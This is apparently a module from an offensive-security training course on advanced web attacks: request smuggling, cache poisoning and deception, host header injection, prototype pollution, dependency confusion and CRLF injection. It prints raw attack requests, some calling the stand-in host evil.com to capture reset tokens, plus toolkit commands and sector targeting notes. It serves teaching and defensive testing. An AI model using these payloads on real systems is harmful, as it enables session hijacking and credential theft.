# Module 16 · Advanced Web Attacks

The attacks in this module are *what get you on bug bounty leaderboards.* They live below the application layer — in the gap between the load balancer, the CDN, and the application server. Most are research-driven by James Kettle (PortSwigger), Orange Tsai, and a handful of others, and most have full PortSwigger Web Security Academy labs which are the canonical training.

Read this module slowly. The attacks are precise, the success criteria are subtle, and the impact is enormous when they land.

## 1. HTTP Request Smuggling — the canonical desync

When a frontend (CDN/load balancer/WAF) and backend (origin) disagree on where one HTTP request ends and the next begins, an attacker can prepend bytes to the next person's request. That's HTTP request smuggling.

The disagreement comes from two HTTP/1.1 features that *both* describe a body length:
- `Content-Length: N` — body is exactly N bytes
- `Transfer-Encoding: chunked` — body is a series of chunks

When **both are present**, RFC 7230 says: `Transfer-Encoding` wins, and `Content-Length` should be removed. Real implementations don't all agree.

### CL.TE — frontend uses CL, backend uses TE

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- **Frontend** reads 13 bytes after blank line (`0\r\n\r\nSMUGGLED`) as one request.
- **Backend** sees `Transfer-Encoding: chunked`, reads `0\r\n\r\n` as the body terminator. The trailing `SMUGGLED` becomes the *start of the next request*.

So when the next legitimate user sends a request, the backend prepends `SMUGGLED` to it.

### TE.CL — frontend uses TE, backend uses CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- **Frontend** chunked-decodes; `8\r\nSMUGGLED\r\n0\r\n\r\n` is one request body.
- **Backend** ignores TE, reads 3 bytes `8\r\n` as body. Everything after is the next request — starting with `SMUGGLED`.

### TE.TE — both use TE, but obfuscated headers confuse one of them

The attacker sends `Transfer-Encoding` in a slightly malformed way that one implementation accepts and the other rejects:

```
Transfer-Encoding: chunked
Transfer-Encoding: x

# or

Transfer-Encoding : chunked   ← note space before colon

# or

Transfer-encoding: chunked   ← case differences

# or

Transfer-Encoding:[\x0b]chunked   ← obscure whitespace
```

Frontend accepts the obfuscated TE, backend doesn't (or vice versa) → desync.

### HTTP/2 → HTTP/1 desync (H2.CL, H2.TE, H2.0)

The attack vector du jour for 2022-2026. Frontend speaks HTTP/2, backend HTTP/1. The frontend translates by laying H2 pseudo-headers into H1 line format. If the H2 message contains a `:method` or invalid `:authority` that the H1 backend interprets differently, you get desync.

**Key technique: TE injection via H2.** HTTP/2 forbids `Transfer-Encoding` headers, but lots of frontends pass them through anyway:

```
:method   POST
:path     /
:authority target.com
content-length 4
transfer-encoding chunked

(body) GPOST / HTTP/1.1\r\nHost: ...
```

The frontend serializes this to H1 with both CL and TE → the backend desyncs.

### Single-packet attack (HTTP/2 race conditions)

Sending many HTTP/2 requests in **the same TCP packet** so they hit the backend at functionally the same instant. Defeats race-condition windows. Used for transfer race-condition exploits, OAuth state confusion, etc.

### Detection methodology

Desync detection is a **timing attack**. Send a probe that *should* hang or error if smuggling works:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Length: 200

X=Y
0

```

If the backend uses CL (4 bytes), it reads only `5c\r\n` and waits for next request. The next legitimate request gets `GPOST...` prepended → either errors or hangs unusually long. Time the response. Compare to a baseline.

Our **`smuggler.py`** runs the full PortSwigger detection methodology: CL.TE, TE.CL, TE.TE with header variations, H2.0 simple, H2.CL, H2.TE. It does **timing-based detection only by default** — full exploitation requires manual handling.

### Reading list (mandatory)

- Kettle, *HTTP Desync Attacks* (2019)
- Kettle, *HTTP/2: The Sequel is Always Worse* (2021)
- Kettle, *Browser-Powered Desync Attacks* (2022)
- Kettle, *Smashing the State Machine* (2023)
- Kettle, *Listen to the Whispers* (2024) — HTTP/3 / QUIC

## 2. Web Cache Poisoning

A CDN caches responses keyed on URL + a few headers ("the cache key"). If you can make the cache store a malicious response, every subsequent visitor gets the malicious response.

**The crucial insight: many response-influencing inputs are NOT part of the cache key.**

Examples of unkeyed inputs that affect the response:
- `X-Forwarded-Host` / `X-Forwarded-Scheme` / `X-Forwarded-Proto`
- `X-Original-URL`
- `Referer` (sometimes reflected)
- The hostname in the absolute-form request line
- The body of a POST that includes some component of the response

### Detection methodology

```python
# 1. Find a parameter or header that the response reflects but is unkeyed
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: rs-canary-12345.com

→ Look for "rs-canary-12345.com" in the response body
→ If it's there, this header influences the response

# 2. Determine cache key by sending varying values
GET /?cb=1 HTTP/1.1   ← cache buster, ensures fresh response
Host: target.com
X-Forwarded-Host: evil.com

GET /?cb=1 HTTP/1.1   ← same URL, no header
Host: target.com

→ Second response identical to first, despite no header
→ X-Forwarded-Host is NOT in cache key, but IS reflected
→ POISONABLE

# 3. Send the malicious version, observe other requesters get it
```

Our **`cache_poison_probe.py`** automates the unkeyed-input discovery loop with a curated header list, then verifies poisonability with a cache-buster.

### Common payloads

- **JS injection via X-Forwarded-Host**: page renders `<script src="https://${host}/main.js">` → poisoning makes every visitor load attacker's JS
- **Open redirect via X-Forwarded-Scheme**: page does `window.location = '${scheme}://target.com/'` → poisoning to `javascript` → XSS
- **DoS via cache-killer parameters**: poison the cache with a 500 response → every cache hit returns 500

## 3. Web Cache Deception

Inverse of poisoning: make the cache store a *user-specific* response under a URL the cache thinks is static.

**The setup:**

```
GET /api/profile        → returns user's private profile (Cache-Control: no-store)
GET /static/cat.jpg     → cached as static asset (Cache-Control: public, max-age=31536000)
```

**The attack:**

```
GET /api/profile/cat.jpg  → some routes match /api/profile/.* and return profile
                          → cache sees `.jpg` extension, decides to cache
                          → next visitor to /api/profile/cat.jpg gets victim's profile
```

Discovery method: append common static extensions (`.jpg`, `.css`, `.js`, `.ico`, `.png`, `.svg`, `.html`, `.txt`) to dynamic endpoints; send authenticated; logout; re-fetch unauthenticated. If you get the authenticated response unauthenticated, deception works.

Our **`cache_deception.py`** runs this discovery loop.

## 4. Host Header Injection

When the application uses the `Host:` header to construct URLs (password reset, OAuth redirect, etc.), an attacker controlling the Host can:

- Make password reset emails contain attacker-controlled URLs
- Steal OAuth `state` parameters via redirect manipulation
- Cache poison (combined with the above)

**The classic password reset vulnerability:**

```http
POST /password-reset HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

If the app builds the reset URL as `https://${Host}/reset?token=...`, the email goes to the victim with `https://evil.com/reset?token=...` — and the victim, trusting the email, clicks. The token is logged at evil.com.

**Variations:**

- `X-Forwarded-Host: evil.com` — bypasses simple Host validation
- `Host: target.com\r\nX-Custom: evil.com` — header injection variant
- `Host: target.com:80@evil.com` — userinfo trick
- `Host: evil.com\nHost: target.com` — duplicate Host headers

Our **`host_header_attacks.py`** runs the password-reset and forgot-account flows with Host variations and reports any that result in attacker-controlled URLs in email/response.

## 5. Prototype Pollution

A JavaScript-specific vulnerability. JS objects all inherit from `Object.prototype`. Modifying `Object.prototype` affects every object in the runtime.

```javascript
({}).foo            // undefined
Object.prototype.foo = "polluted"
({}).foo            // "polluted"  ← every object now has .foo
```

Server-side prototype pollution in Node.js leads to RCE in many libraries (Lodash, jQuery, hbs). Client-side leads to XSS or auth bypass.

**The vulnerable pattern:**

```javascript
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Attacker payload:
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// Now ALL objects have isAdmin = true.
```

**Detection (server-side):**

Send a JSON body with `__proto__.<random_canary>: <random_value>` and then probe an endpoint that might reflect prototype properties. If your canary leaks, you have pollution.

**Detection (client-side):**

Look for `?__proto__[<key>]=<val>` and `&constructor[prototype][<key>]=<val>` and `?[<key>][<...>]=...` in URL parsing in the SPA's JS. Tooling like DOMPurify-protected vs. unprotected templates make this hard to test without manual analysis.

Our **`proto_pollution_probe.py`** runs the canary detection loop against JSON-accepting endpoints.

## 6. Dependency Confusion

Discovered by Alex Birsan in 2021, paid out hundreds of thousands at Apple, Microsoft, PayPal. The mechanism:

A company uses a private NPM/PyPI/RubyGems package called `acmecorp-internal-utils`. They install it from their internal registry. If they configure their package manager to fall back to the public registry when a name isn't found... or even just to *combine* the two and pick the higher version...

...you publish `acmecorp-internal-utils` on the public PyPI/NPM with version `99.9.9`. Their builds pick yours, run your `setup.py` / `package.json` postinstall script, RCE on their CI.

**Detection:**

1. Find package names referenced in their public code (GitHub, npm registry, JS bundles)
2. Check whether each package exists on the public registry
3. If it doesn't, the namespace is squat-ready

Our **`dependency_confusion.py`** scans GitHub repos and JS bundles for package references, then queries public registries to find unsquatted internal package names.

## 7. SSRF chained to Cloud Metadata (deeper than Module 14)

Module 14 covered the basic SSRF detection. The advanced chain:

```
SSRF →
  IMDSv1 → temporary IAM credentials (AccessKeyId, SecretAccessKey, Token) →
    aws cli with these credentials →
      Read S3 buckets, RDS, Lambda, IAM →
        Privilege escalation via :CreateAccessKey on another role →
          Permanent foothold
```

Each step is its own module in cloud (Part 9), but the bridge is SSRF.

Our `ssrf_prober.py` covers the metadata fetch; `redshift_toolkit/cloud/` (Part 9) will cover credential abuse.

## 8. CRLF Injection / HTTP Response Splitting

If an application reflects user input into a response header, an attacker injecting `\r\n` can:

- Inject additional headers (Set-Cookie, Location, etc.)
- Split the response into two responses (cache poisoning ammo)
- Set `Content-Length: 0\r\n\r\n` then provide attacker-controlled body

```
GET /redirect?url=foo%0d%0aSet-Cookie:%20admin=true HTTP/1.1
```

Most modern frameworks block `\r\n` in headers, but **node.js prior to several CVEs**, **PHP**, and **Java HttpServletResponse.setHeader** historically allowed it. Still found in Internet-of-Things web admin panels.

Detection lives in `host_header_attacks.py` and `auth_bypass_probe.py` already.

## 9. The 90-minute advanced-attack pass

Given a target with an interesting-looking CDN/proxy chain:

```bash
# 1. Fingerprint the chain
python3 -m redshift_toolkit.web.http_client --fingerprint --url https://target.com
# → look for Server, Via, X-Cache, CF-RAY, X-Amz-Cf-Id, etc.

# 2. Smuggling probe (timing-based)
python3 -m redshift_toolkit.web.smuggler --url https://target.com

# 3. Cache poisoning probe
python3 -m redshift_toolkit.web.cache_poison_probe --url https://target.com

# 4. Cache deception
python3 -m redshift_toolkit.web.cache_deception --url https://target.com/api/profile \
    --auth-cookie 'session=...'

# 5. Host header attacks (if there's a password reset flow)
python3 -m redshift_toolkit.web.host_header_attacks \
    --reset-url https://target.com/forgot-password --email test@target.com

# 6. Prototype pollution
python3 -m redshift_toolkit.web.proto_pollution_probe \
    --url https://target.com/api/merge --param data

# 7. Dependency confusion (org-level scan)
python3 -m redshift_toolkit.web.dependency_confusion --org acme-corp
```

## 10. Industry-specific framings

### Financial services

Smuggling on the public-facing tier is catastrophic — leads to user-session hijack across millions of customers. Prioritize the WAF→app boundary; banks frequently run WAF (Akamai/Imperva) in front of NGINX/Tomcat backends with subtle parser disagreements.

### Healthcare

Patient portals are often AWS-fronted with CloudFront → ALB → containerized backend. Smuggling at the CloudFront layer hits multiple tenants. Cache poisoning on the marketing pages can trick patients into phishing pages still on the legitimate domain.

### Government

Many agencies use Cloudflare or Akamai in front. Cache poisoning can swap legitimate gov.uk / .gov pages with attacker content **on the legitimate domain** — devastating misinformation vector. Smuggling on auth servers can swap users between agencies.

### Critical infrastructure

ICS HMIs are rarely behind sophisticated CDNs, so smuggling is rarer. But host-header injection on operator portals is common and can be combined with a phishing email to redirect operators to spoofed SCADA login pages.

## 11. Recap

You should now be able to:

- Detect HTTP request smuggling in CL.TE, TE.CL, TE.TE, and H2 variants using timing
- Identify cache poisoning surface and verify it with cache busters
- Detect cache deception by appending static-looking extensions to dynamic URLs
- Probe for prototype pollution in JSON-accepting endpoints
- Find dependency-confusion candidates from a target's public code
- Trigger host-header attacks against password-reset flows

Tools shipped with this module:

| Script | Purpose |
|---|---|
| `redshift_toolkit.web.smuggler` | HTTP request smuggling detector (CL.TE, TE.CL, TE.TE, H2) |
| `redshift_toolkit.web.cache_poison_probe` | Web cache poisoning prober |
| `redshift_toolkit.web.cache_deception` | Cache deception detector |
| `redshift_toolkit.web.proto_pollution_probe` | Prototype pollution detector |
| `redshift_toolkit.web.dependency_confusion` | Dependency confusion checker |
| `redshift_toolkit.web.host_header_attacks` | Host header injection probe |
| `scripts/part-04/16-advanced-web/advanced_runner.py` | Module 16 orchestrator |

→ Next: [Module 17 · Authentication & Authorization](17-auth-authz.md).
